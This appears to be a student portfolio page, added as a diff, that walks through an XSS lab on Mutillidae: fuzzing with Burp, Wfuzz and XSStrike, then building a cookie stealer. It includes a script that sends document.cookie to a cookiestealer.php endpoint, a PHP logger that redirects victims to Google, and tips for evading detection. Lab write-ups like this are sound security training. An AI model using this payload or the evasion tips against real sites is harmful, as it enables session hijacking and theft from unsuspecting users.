@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cross-Site Scripting (XSS) Attacks</title>
+<style>
+:root {
+  --bg: #0a0a0f;
+  --bg-secondary: #12121a;
+  --bg-card: #1a1a2e;
+  --text: #e0e0e0;
+  --text-secondary: #c8c8d8;
+  --text-muted: #9898a8;
+  --primary: #00d4ff;
+  --primary-dim: rgba(0, 212, 255, 0.15);
+  --accent: #7c3aed;
+  --border: rgba(255, 255, 255, 0.08);
+  --border-glow: rgba(0, 212, 255, 0.3);
+  --font-sans: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  --font-mono: "JetBrains Mono", "Fira Code", "SF Mono", Consolas, monospace;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: var(--font-sans); line-height: 1.7; min-height: 100vh; }
+.back-link { position: fixed; top: 20px; left: 20px; color: var(--primary); text-decoration: none; font-size: 14px; font-weight: 500; display: flex; align-items: center; gap: 6px; z-index: 100; background: var(--bg-card); padding: 8px 16px; border-radius: 20px; border: 1px solid var(--border); transition: all 0.3s ease; }
+.back-link:hover { border-color: var(--border-glow); box-shadow: 0 0 15px rgba(0, 212, 255, 0.2); }
+.hero { padding: 80px 40px 40px; text-align: center; border-bottom: 1px solid var(--border); background: linear-gradient(180deg, rgba(0, 212, 255, 0.03) 0%, transparent 100%); }
+.hero h1 { font-size: clamp(24px, 4vw, 36px); font-weight: 700; color: #fff; margin-bottom: 12px; letter-spacing: -0.5px; }
+.hero .meta { color: var(--text-muted); font-size: 14px; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
+.hero .meta span { display: flex; align-items: center; gap: 6px; }
+.container { max-width: 880px; margin: 0 auto; padding: 40px 24px 80px; }
+h2 { font-size: 22px; font-weight: 600; color: #fff; margin-top: 48px; margin-bottom: 16px; padding-bottom: 8px; border-bottom: 2px solid var(--primary); display: inline-block; }
+h3 { font-size: 17px; font-weight: 600; color: var(--text); margin-top: 28px; margin-bottom: 10px; }
+p { margin: 12px 0; font-size: 15px; color: var(--text-secondary); }
+strong { color: var(--text); }
+ul, ol { margin: 12px 0; padding-left: 24px; }
+li { margin: 6px 0; font-size: 15px; color: var(--text-secondary); }
+code { background: var(--bg-secondary); color: var(--primary); padding: 2px 7px; border-radius: 4px; font-family: var(--font-mono); font-size: 13px; border: 1px solid var(--border); }
+pre { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 16px 20px; overflow-x: auto; font-family: var(--font-mono); font-size: 13px; color: var(--text); margin: 16px 0; }
+pre code { background: none; border: none; padding: 0; color: inherit; }
+.screenshot { margin: 20px 0; border: 1px solid var(--border); border-radius: 10px; overflow: hidden; transition: all 0.3s ease; }
+.screenshot:hover { border-color: var(--border-glow); box-shadow: 0 4px 20px rgba(0, 212, 255, 0.1); }
+.screenshot img { display: block; width: 100%; height: auto; cursor: pointer; }
+.screenshot-caption { font-size: 12px; color: var(--text-muted); padding: 10px 14px; background: var(--bg-secondary); border-top: 1px solid var(--border); }
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
+th { text-align: left; color: var(--text-muted); font-weight: 500; padding: 10px 14px; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
+td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text-secondary); }
+hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+.takeaways { background: var(--bg-secondary); border-left: 3px solid var(--primary); padding: 20px 24px; border-radius: 0 10px 10px 0; margin: 24px 0; }
+.takeaways li { color: var(--text); }
+.tags { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
+.tag { background: var(--primary-dim); color: var(--primary); padding: 5px 12px; border-radius: 100px; font-size: 12px; font-weight: 500; border: 1px solid rgba(0, 212, 255, 0.2); }
+.lightbox { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; cursor: pointer; }
+.lightbox.active { display: flex; }
+.lightbox img { max-width: 95vw; max-height: 95vh; object-fit: contain; border-radius: 4px; }
+@media (max-width: 640px) { .hero { padding: 60px 20px 30px; } .container { padding: 24px 16px 60px; } h2 { font-size: 19px; } }
+</style>
+</head>
+<body>
+
+<a href="javascript:history.back()" class="back-link">&#x2190; Back to Portfolio</a>
+
+<div class="hero">
+  <h1>Cross-Site Scripting (XSS) Attacks</h1>
+  <div class="meta">
+    <span>&#x1F4C2; Ethical Hacking</span>
+    <span>&#x1F4C5; 2023</span>
+    <span>&#x1F393; MSIA Program</span>
+  </div>
+</div>
+
+<div class="container">
+<h1>Cross-Site Scripting (XSS) Security Analysis</h1>
+<h2>Project Overview</h2>
+<p>In this project, I conducted a comprehensive security analysis of Cross-Site Scripting (XSS) vulnerabilities, one of the most prevalent attack vectors on the web today. XSS attacks occur when malicious scripts are injected into otherwise trusted websites, allowing attackers to steal sensitive data, hijack sessions, or redirect users without their knowledge.</p>
+<p>I demonstrated both the offensive capabilities of XSS exploitation and the defensive implications of poor input validation. The project consisted of two major phases: discovering XSS vulnerabilities through automated fuzzing techniques, and developing a functional JavaScript-based cookie stealer to illustrate the real-world impact of unpatched XSS flaws.</p>
+<h2>Environment Setup</h2>
+<p>I conducted all testing in an isolated lab environment consisting of:
+- <strong>Attacking Machine</strong>: Kali Linux with penetration testing tools pre-installed
+- <strong>Target Machine</strong>: Metasploitable 2 (intentionally vulnerable Linux VM)
+- <strong>Target Application</strong>: Mutillidae, a deliberately vulnerable web application designed for security training</p>
+<p>I used VirtualBox to create an isolated network between the attacking and target machines, ensuring all tests remained contained within the lab environment.</p>
+<h2>Phase 1: Discovering XSS Vulnerabilities Through Fuzzing</h2>
+<p>To identify XSS vulnerabilities efficiently, I employed three complementary fuzzing tools. My objective was to probe the Mutillidae application's DNS Lookup feature (accessible via OWASP Top 10 → Cross Site Scripting → Reflected → DNS Lookup) for reflected XSS flaws.</p>
+<p><strong>Mutillidae DNS Lookup interface - the entry point for XSS fuzzing.</strong></p>
+<p><div class="screenshot"><img src="images/image_001.png" alt="" loading="lazy"></div></p>
+<h3>Burp Suite Proxy &amp; Intruder</h3>
+<p>I began by configuring Firefox to route all traffic through Burp Suite's proxy on <code>127.0.0.1:8080</code>. This allowed me to intercept and modify HTTP requests in real-time.</p>
+<p><strong>Firefox proxy configuration - routing all traffic through Burp Suite on port 8080.</strong></p>
+<p><div class="screenshot"><img src="images/image_002.png" alt="" loading="lazy"></div></p>
+<p><strong>Burp Suite Proxy tab with Intercept enabled - ready to capture requests.</strong></p>
+<p><div class="screenshot"><img src="images/image_003.png" alt="" loading="lazy"></div></p>
+<p>I then submitted a test value (127.0.0.1) in the Mutillidae DNS Lookup field, which was immediately captured by Burp's proxy.</p>
+<p><strong>Request captured by Burp proxy - now ready for fuzzing.</strong></p>
+<p><div class="screenshot"><img src="images/image_004.png" alt="" loading="lazy"></div></p>
+<p>Rather than manually testing each payload, I leveraged Burp's Intruder module to automate the process. I extracted the hostname parameter and configured it as the fuzzing target using the Sniper attack type. This iterates through a list of payloads one position at a time—ideal for discovering injection points.</p>
+<p><strong>Intruder configuration - specifying the target parameter for fuzzing.</strong></p>
+<p><div class="screenshot"><img src="images/image_005.png" alt="" loading="lazy"></div></p>
+<p>I loaded a comprehensive XSS wordlist from the system dictionary at <code>/usr/share/wfuzz/wordlist/Injections/XSS.txt</code>, which contained dozens of known XSS payloads.</p>
+<p><strong>Payload loading interface - importing the XSS.txt wordlist.</strong></p>
+<p><div class="screenshot"><img src="images/image_006.png" alt="" loading="lazy"></div></p>
+<p>After initiating the attack, Burp iteratively sent each payload and logged the response codes and sizes. The results revealed multiple successful injections.</p>
+<p><strong>Attack results - Burp successfully identifies payloads that bypass the application's filters.</strong></p>
+<p><div class="screenshot"><img src="images/image_007.png" alt="" loading="lazy"></div></p>
+<p>To validate the vulnerability, I extracted payload #3 and manually injected it into the DNS Lookup field. The JavaScript executed successfully, displaying an alert box—proof of a reflected XSS vulnerability.</p>
+<p><strong>Successful XSS execution - alert box triggered by the injected payload.</strong></p>
+<p><div class="screenshot"><img src="images/image_008.png" alt="" loading="lazy"></div></p>
+<h3>Wfuzz Command-Line Fuzzer</h3>
+<p>For a command-line based approach, I used Wfuzz, which offered more flexibility and speed than Burp for this particular task.</p>
+<p><strong>Wfuzz help menu - displaying available options for fuzzing.</strong></p>
+<p><div class="screenshot"><img src="images/image_009.png" alt="" loading="lazy"></div></p>
+<p>I executed Wfuzz against the same DNS Lookup parameter, specifying the XSS wordlist and enabling colored output for easier result analysis:</p>
+<p><strong>Wfuzz output - each payload tested with response codes and content analysis.</strong></p>
+<p><div class="screenshot"><img src="images/image_010.png" alt="" loading="lazy"></div></p>
+<p><div class="screenshot"><img src="images/image_011.png" alt="" loading="lazy"></div></p>
+<p>Wfuzz's output provided immediate feedback: response codes, response sizes, and payload details. This made it easy to identify which payloads generated different behaviors—a sign of successful code execution.</p>
+<p>To further refine my fuzzing, I explored Wfuzz's encoding capabilities. Many web applications employ basic filters that can be bypassed through URL encoding or other transformations.</p>
+<p><strong>Wfuzz encoder list - displaying available payload transformations.</strong></p>
+<p><div class="screenshot"><img src="images/image_012.png" alt="" loading="lazy"></div></p>
+<p>I appended URL encoding to the payload pipeline, which transformed each XSS payload into its percent-encoded equivalent:</p>
+<p><strong>URL-encoded payloads - bypassing simple character-based filters.</strong></p>
+<p><div class="screenshot"><img src="images/image_013.png" alt="" loading="lazy"></div></p>
+<p><div class="screenshot"><img src="images/image_014.png" alt="" loading="lazy"></div></p>
+<p>The results remained consistent, proving that the application's filters were minimal and vulnerable to encoded payloads.</p>
+<h3>XSStrike Automated Scanner</h3>
+<p>The final tool I evaluated was XSStrike, a dedicated XSS detection suite featuring intelligent payload generation, DOM-based XSS detection, and WAF evasion capabilities.</p>
+<p><strong>XSStrike requires installation from GitHub. I downloaded and extracted the project.</strong></p>
+<p><div class="screenshot"><img src="images/image_015.png" alt="" loading="lazy"></div></p>
+<p>After extracting the archive and navigating to the XSStrike directory, I launched the tool via Python 3.</p>
+<p><strong>XSStrike installation and execution - ready for scanning.</strong></p>
+<p><div class="screenshot"><img src="images/image_016.png" alt="" loading="lazy"></div></p>
+<p>XSStrike provided an interactive scanning experience with a comprehensive help menu:</p>
+<p><strong>XSStrike help menu - showing available flags and options.</strong></p>
+<p><div class="screenshot"><img src="images/image_017.png" alt="" loading="lazy"></div></p>
+<p>I executed XSStrike against the target URL, specifying the DNS Lookup parameter:</p>
+<p><strong>XSStrike parameter analysis - identifying potentially vulnerable inputs.</strong></p>
+<p><div class="screenshot"><img src="images/image_018.png" alt="" loading="lazy"></div></p>
+<p>The tool began by testing for DOM-based vulnerabilities, then progressed to reflected XSS. When it identified a likely vulnerable parameter, it displayed an interactive payload generator with success probability estimates.</p>
+<p><strong>XSStrike continued scanning with user confirmation.</strong></p>
+<p><div class="screenshot"><img src="images/image_019.png" alt="" loading="lazy"></div></p>
+<p>I also tested XSStrike's fuzzing capabilities with optimizations for speed:</p>
+<p><strong>XSStrike scanning with --skip-dom flag - skipping DOM checks to focus on reflected XSS payloads.</strong></p>
+<p><div class="screenshot"><img src="images/image_020.png" alt="" loading="lazy"></div></p>
+<p>By disabling DOM-based checking and using the fuzzer mode with delay flags, I accelerated the fuzzing process without sacrificing accuracy.</p>
+<p><strong>XSStrike fuzzer results - testing various HTML tags and attributes with "[passed]" indicators.</strong></p>
+<p><div class="screenshot"><img src="images/image_021.png" alt="" loading="lazy"></div></p>
+<h2>Phase 2: Building a JavaScript-Based Cookie Stealer</h2>
+<p>Understanding how to detect XSS vulnerabilities is only half the battle. To truly appreciate the security implications, I developed a functional cookie stealer—demonstrating how an attacker leverages XSS to extract sensitive session data.</p>
+<h3>Setting Up the Test Environment</h3>
+<p>I created a local test environment to safely develop and validate the attack without compromising any real systems.</p>
+<p><strong>Initial directory and file structure for the cookie stealer project.</strong></p>
+<p><div class="screenshot"><img src="images/image_022.png" alt="" loading="lazy"></div></p>
+<p>I started with a basic HTML file containing only the essential tags:</p>
+<p><strong>Minimal HTML structure - ready to embed JavaScript.</strong></p>
+<p><div class="screenshot"><img src="images/image_023.png" alt="" loading="lazy"></div></p>
+<p><strong>Browser rendering the initial HTML file - displaying "Hello World" to confirm the setup works.</strong></p>
+<p><div class="screenshot"><img src="images/image_024.png" alt="" loading="lazy"></div></p>
+<h3>Creating and Stealing Cookies</h3>
+<p>To demonstrate how cookies are set and accessed, I wrote inline JavaScript to create a test cookie:</p>
+<pre><code class="language-javascript">&lt;script type=&quot;text/javascript&quot;&gt;
+  document.cookie = &quot;username=Null Byte&quot;;
+&lt;/script&gt;
+</code></pre>
+<p><strong>Cookie creation script embedded in the HTML body.</strong></p>
+<p><div class="screenshot"><img src="images/image_025.png" alt="" loading="lazy"></div></p>
+<p>To verify the cookie was created, I used <code>document.write()</code> to display it on the page:</p>
+<p><strong>Adding document.write(document.cookie) to the HTML source in nano editor.</strong></p>
+<p><div class="screenshot"><img src="images/image_026.png" alt="" loading="lazy"></div></p>
+<p><strong>The rendered page showing the stolen cookie in plaintext.</strong></p>
+<p><div class="screenshot"><img src="images/image_027.png" alt="" loading="lazy"></div></p>
+<p>This proved the concept—any JavaScript executed in the page's context can read and modify cookies. In a real attack, I wouldn't display the cookie; instead, I'd exfiltrate it to an attacker-controlled server.</p>
+<h3>Exfiltrating Cookies to a Remote Server</h3>
+<p>I modified the JavaScript to send the cookie to a PHP endpoint on the attacker's server:</p>
+<pre><code class="language-javascript">&lt;script type=&quot;text/javascript&quot;&gt;
+  document.location='http://127.0.0.1/cookiestealer.php?c='+document.cookie;
+&lt;/script&gt;
+</code></pre>
+<p>This payload encodes the stolen cookie as a URL parameter and redirects the user to the attacker's server.</p>
+<p><strong>The complete HTML file with cookie exfiltration JavaScript.</strong></p>
+<p><div class="screenshot"><img src="images/image_028.png" alt="" loading="lazy"></div></p>
+<p><strong>Revised cookie stealer script with corrected server path (127.0.0.1/cookiestealer.php).</strong></p>
+<p><div class="screenshot"><img src="images/image_029.png" alt="" loading="lazy"></div></p>
+<h3>Processing Stolen Cookies with PHP</h3>
+<p>On the server side, I created a PHP script to receive and store the exfiltrated cookies:</p>
+<p><strong>Initial PHP script with redirect header - the first step in building the cookie handler.</strong></p>
+<p><div class="screenshot"><img src="images/image_030.png" alt="" loading="lazy"></div></p>
+<p>The PHP script performs three key functions:
+1. <strong>Capture the cookie</strong> from the URL parameter: <code>$cookies = $_GET["c"];</code>
+2. <strong>Log the cookie</strong> to a file for later analysis: <code>$file = fopen('log.txt', 'a');</code>
+3. <strong>Redirect the user</strong> to avoid suspicion: <code>header("Location: https://google.com");</code></p>
+<p><strong>Complete PHP handler - receiving, logging, and redirecting.</strong></p>
+<p><div class="screenshot"><img src="images/image_031.png" alt="" loading="lazy"></div></p>
+<p>By redirecting to a legitimate-looking site (in this case, Google), I minimized the chance that the victim would notice the attack.</p>
+<h3>Testing the Attack</h3>
+<p>I launched PHP's built-in development server to host the malicious page locally:</p>
+<pre><code class="language-bash">php -S 127.0.0.1:80
+</code></pre>
+<p><strong>PHP development server log showing the attack in action - cookie exfiltrated via GET request to cookiestealer.php.</strong></p>
+<p><div class="screenshot"><img src="images/image_032.png" alt="" loading="lazy"></div></p>
+<p>When I accessed the page in a browser, the JavaScript executed immediately:</p>
+<p><strong>Browser navigating to 127.0.0.1 - autocomplete reveals the cookiestealer URL from prior requests.</strong></p>
+<p><div class="screenshot"><img src="images/image_033.png" alt="" loading="lazy"></div></p>
+<p>The browser was instantly redirected to Google, making the attack largely invisible to the end user:</p>
+<p><strong>Browser redirects to Google - the victim remains unaware.</strong></p>
+<p><div class="screenshot"><img src="images/image_034.png" alt="" loading="lazy"></div></p>
+<p>Checking the server logs confirmed that the PHP script executed and received the cookie parameter:</p>
+<p><strong>PHP server access log - showing the cookie parameter in the request.</strong></p>
+<p><div class="screenshot"><img src="images/image_035.png" alt="" loading="lazy"></div></p>
+<p>Finally, I verified that the cookie was successfully logged to disk:</p>
+<p><strong>The log.txt file containing the stolen cookie.</strong></p>
+<p><div class="screenshot"><img src="images/image_036.png" alt="" loading="lazy"></div></p>
+<p>The stolen cookie (<code>username=Null Byte</code>) was now in my possession—a perfect demonstration of how XSS leads to credential compromise.</p>
+<h3>Deployment Considerations</h3>
+<p>In a real-world attack scenario, I would inject this malicious script into a vulnerable web form or reflected parameter. To test for XSS during reconnaissance, attackers typically use a simple proof-of-concept like:</p>
+<pre><code class="language-javascript">&lt;script&gt;alert(&quot;Alert&quot;);&lt;/script&gt;
+</code></pre>
+<p><strong>Proof-of-concept XSS alert box - confirming script execution in the browser context.</strong></p>
+<p><div class="screenshot"><img src="images/image_037.png" alt="" loading="lazy"></div></p>
+<p>If the alert box appears, the application is vulnerable. From there, the attacker can escalate to data exfiltration as I demonstrated.</p>
+<p>To evade detection, attackers would host the PHP logger on infrastructure that's difficult to trace, obfuscate the JavaScript, and redirect victims to pages contextually relevant to the compromised site.</p>
+<h2>Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>XSS is Widespread</strong>: Even basic web applications often fail to properly validate and encode user input, leaving them vulnerable to injection attacks.</p>
+</li>
+<li>
+<p><strong>Multiple Detection Vectors</strong>: Automated tools like Burp Suite, Wfuzz, and XSStrike each provide unique advantages. Combining them increases the likelihood of discovering vulnerabilities.</p>
+</li>
+<li>
+<p><strong>Encoding Bypasses Basic Filters</strong>: Simple character-based filters are ineffective against encoded payloads. Proper input validation requires context-aware encoding (HTML encoding, JavaScript encoding, URL encoding).</p>
+</li>
+<li>
+<p><strong>JavaScript Execution Enables Data Theft</strong>: Once JavaScript executes in a user's browser context, the attacker has access to all cookies, session tokens, and DOM content associated with that page.</p>
+</li>
+<li>
+<p><strong>Behavioral Redirection Masks Attacks</strong>: By redirecting victims to legitimate sites after stealing their data, attackers can maintain operational security and avoid detection.</p>
+</li>
+</ol>
+<h2>Tools Used</h2>
+<ul>
+<li><strong>Burp Suite Community Edition</strong>: Web proxy and fuzzing platform for intercepting and modifying HTTP traffic</li>
+<li><strong>Wfuzz</strong>: Command-line fuzzer with payload encoding and dictionary support</li>
+<li><strong>XSStrike</strong>: Automated XSS scanner with intelligent payload generation and WAF detection</li>
+<li><strong>PHP Development Server</strong>: Lightweight server for hosting malicious payloads</li>
+<li><strong>Firefox with Proxy Configuration</strong>: Browser configured to route traffic through Burp Suite</li>
+<li><strong>Metasploitable 2 &amp; Mutillidae</strong>: Intentionally vulnerable test environments</li>
+<li><strong>Kali Linux</strong>: Penetration testing distribution with pre-installed security tools</li>
+</ul>
+<h2>Skills Demonstrated</h2>
+<ul>
+<li><strong>Web Application Security Assessment</strong>: Identified real XSS vulnerabilities in a live web application</li>
+<li><strong>Burp Suite Proficiency</strong>: Configured proxies, used Intruder for automated fuzzing, and analyzed results</li>
+<li><strong>Command-Line Fuzzing</strong>: Executed sophisticated Wfuzz payloads with encoding transformations</li>
+<li><strong>Vulnerability Automation</strong>: Evaluated and leveraged automated scanning tools (XSStrike)</li>
+<li><strong>Full-Stack Exploit Development</strong>: Wrote HTML, JavaScript, and PHP to create an end-to-end attack</li>
+<li><strong>Secure Coding Concepts</strong>: Understood input validation, output encoding, and defense mechanisms</li>
+<li><strong>Network Isolation &amp; Lab Setup</strong>: Configured a safe, contained lab environment for security testing</li>
+<li><strong>Attack Methodology</strong>: Demonstrated reconnaissance, exploitation, and post-exploitation phases</li>
+</ul>
+</div>
+
+<div class="lightbox" id="lightbox" onclick="this.classList.remove('active')">
+  <img id="lightbox-img" src="" alt="Full size">
+</div>
+
+<script>
+document.querySelectorAll('.screenshot img').forEach(img => {
+  img.addEventListener('click', () => {
+    document.getElementById('lightbox-img').src = img.src;
+    document.getElementById('lightbox').classList.add('active');
+  });
+});
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') document.getElementById('lightbox').classList.remove('active');
+});
+</script>
+
+</body>
+</html>
